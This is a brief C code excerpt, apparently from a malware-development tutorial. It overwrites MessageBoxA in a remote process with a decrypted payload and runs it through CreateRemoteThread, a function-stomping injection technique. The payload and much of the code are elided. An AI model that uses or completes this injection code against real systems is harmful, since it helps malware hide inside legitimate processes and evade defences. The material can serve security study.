...
#pragma comment (lib, "User32.lib") // adding "user32.dll" to the import address table
...
int wmain(int argc, wchar_t* argv[]) {
	...
	getchar();
	printf("[i] Writing ... ");
	if (!WritePayload(hProcess, &MessageBoxA, (PBYTE)pPlaintext, (SIZE_T)dwPlainSize)) {
		return -1;
	}
	printf("[+] DONE \n");
	...
	hThread = CreateRemoteThread(hProcess, NULL, NULL, MessageBoxA, NULL, NULL, NULL);
	if (hThread != NULL)
